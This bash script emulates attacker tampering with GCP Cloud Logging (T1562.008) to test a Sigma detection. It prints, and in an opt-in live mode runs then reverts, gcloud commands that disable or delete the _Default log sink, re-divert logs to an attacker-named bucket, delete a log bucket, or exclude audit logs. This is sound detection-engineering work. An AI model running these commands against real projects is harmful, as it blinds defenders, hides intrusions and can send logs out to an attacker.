#!/usr/bin/env bash
# TRR9038 (T1562.008) behavioral emulation: disrupt GCP Cloud Logging by
# disabling/deleting the project _Default sink, deleting a log bucket, or adding a
# log exclusion that drops audit logs.
#
#   * DOCUMENT (default): prints the gcloud a real operator would run for each
#     procedure. Nothing is changed.
#   * LIVE: with TRR9038_LIVE=1 (or --live) and gcloud authed to YOUR OWN throwaway
#     project, performs the tamper and then RESTORES it (re-enable / re-create the
#     sink, undelete the bucket, delete the exclusion). NEVER run in CI.
#   * FIXTURE: --show-fixture prints the committed Cloud Audit Log fixtures the CI
#     validator runs the detection over.
#
# The _Required sink/bucket is LOCKED and cannot be disabled or deleted, so it is
# not a target: only the _Default sink/bucket and custom sinks/buckets can change.
#
# Rule: detections/sigma/T1562.008/gcp_logging_sink_tampered.yml
set -euo pipefail

PROC="${1:-a}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXDIR="$HERE/../../../detections/cloud/fixtures/trr9038"

if [[ "${1:-}" == "--show-fixture" || "${2:-}" == "--show-fixture" ]]; then
  cat "$FIXDIR/attack.json"; exit 0
fi

echo "== TRR9038.GCP.$PROC — GCP Cloud Logging disruption (T1562.008) =="
case "$PROC" in
  a) echo "A: delete or disable/re-divert the project _Default log sink."
     echo "   gcloud logging sinks delete _Default --project=\$PROJECT      # delete"
     echo "   gcloud logging sinks update _Default --disabled --project=\$PROJECT   # disable"
     echo "   gcloud logging sinks update _Default --destination=storage.googleapis.com/\$ATTACKER_BUCKET  # re-divert" ;;
  b) echo "B: delete the _Default log bucket (drops the logs stored there)."
     echo "   gcloud logging buckets delete _Default --location=global --project=\$PROJECT" ;;
  c) echo "C: add a project-level exclusion that drops the audit-log stream."
     echo "   gcloud logging sinks update _Default --add-exclusion=name=trr9038-drop-audit,filter='logName:\"cloudaudit.googleapis.com\"' --project=\$PROJECT" ;;
  *) echo "usage: emulate_gcp_log_sink.sh {a|b|c} [--live|--show-fixture]"; exit 1 ;;
esac

if [[ "${TRR9038_LIVE:-0}" == "1" || "${2:-}" == "--live" ]]; then
  command -v gcloud >/dev/null || { echo "gcloud not found"; exit 1; }
  : "${TRR9038_PROJECT:?set TRR9038_PROJECT to a throwaway project you own}"
  echo
  echo "[live] project=$TRR9038_PROJECT — this tampers then restores logging config."
  if [[ "$PROC" == "a" ]]; then
    echo "[live] disabling the _Default sink, then re-enabling it..."
    gcloud logging sinks update _Default --disabled --project="$TRR9038_PROJECT"
    gcloud logging sinks update _Default --no-disabled --project="$TRR9038_PROJECT"
  elif [[ "$PROC" == "b" ]]; then
    : "${TRR9038_CUSTOM_BUCKET:?set TRR9038_CUSTOM_BUCKET to a throwaway custom log bucket (never _Required)}"
    echo "[live] deleting then undeleting the throwaway custom bucket $TRR9038_CUSTOM_BUCKET..."
    gcloud logging buckets delete "$TRR9038_CUSTOM_BUCKET" --location=global --project="$TRR9038_PROJECT"
    gcloud logging buckets undelete "$TRR9038_CUSTOM_BUCKET" --location=global --project="$TRR9038_PROJECT" || \
      echo "[live] NOTE: a _Default bucket delete is not undeletable; use a throwaway custom bucket for this test."
  elif [[ "$PROC" == "c" ]]; then
    echo "[live] adding exclusion trr9038-drop-audit to the _Default sink, then removing it..."
    gcloud logging sinks update _Default \
      --add-exclusion="name=trr9038-drop-audit,filter=logName:\"cloudaudit.googleapis.com\"" \
      --project="$TRR9038_PROJECT"
    gcloud logging sinks update _Default --remove-exclusions=trr9038-drop-audit --project="$TRR9038_PROJECT"
  fi
  echo "[live] done. Review the Admin Activity log ConfigServiceV2 event for the tamper."
else
  echo
  echo "(dry) set TRR9038_LIVE=1 (with a throwaway project you own) to run tamper+restore,"
  echo "      or pass --show-fixture for the recorded telemetry."
fi
